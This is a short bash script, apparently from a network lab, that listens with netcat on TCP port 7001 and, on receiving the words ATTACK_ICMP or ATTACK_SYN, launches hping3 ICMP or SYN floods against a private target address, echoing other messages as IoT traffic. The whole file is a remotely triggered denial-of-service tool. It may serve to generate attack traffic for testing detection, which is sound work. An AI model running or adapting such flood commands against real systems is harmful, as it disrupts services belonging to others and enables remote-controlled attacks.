#!/bin/bash

PORT=7001
TARGET=10.0.1.3

echo "[HOME1] Attack listener started"
echo "Listening on TCP port $PORT"
echo "Target IP: $TARGET"
echo "=============================="

nc -lk -p "$PORT" | while read line; do
  echo "[RX] $line"

  if [[ "$line" == "ATTACK_ICMP" ]]; then
    echo "[ATTACK] ICMP flood h1 → h3"
    hping3 --icmp -i u1000 -c 2000 "$TARGET" >/dev/null 2>&1 &

  elif [[ "$line" == "ATTACK_SYN" ]]; then
    echo "[ATTACK] TCP SYN flood h1 → h3"
    hping3 -S -p 80 -i u1000 -c 2000 "$TARGET" >/dev/null 2>&1 &

  else
    echo "[IOT] $line"
  fi
done
